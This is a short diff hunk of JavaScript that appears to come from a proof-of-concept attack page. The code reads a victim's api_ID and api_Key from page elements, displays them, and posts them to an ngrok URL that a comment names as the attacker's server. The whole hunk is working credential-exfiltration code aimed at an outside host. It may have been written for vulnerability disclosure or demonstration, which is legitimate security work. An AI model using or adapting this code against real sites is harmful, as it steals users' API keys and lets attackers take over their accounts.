@@ -19,8 +19,9 @@ var req1 = new XMLHttpRequest();
                         var api_ID = document.getElementsByTagName("span").api_id.firstChild.data
                         var api_Key = document.getElementsByTagName("span").api_key.firstChild.data
                         alert('api_ID = ' + api_ID + '\n' + 'api_Key =' + api_Key);
-                        var stealInfo = new XMLHttpRequest();
+
         // This sends all victim's details(including api_ID, api_Key) to attackers server
+                        var stealInfo = new XMLHttpRequest();
                         stealInfo.open('post', 'https://f259aff8887f.ngrok.io', true);
                         stealInfo.send('api_ID = ' + api_ID + '&api_Key =' + api_Key)
                 };
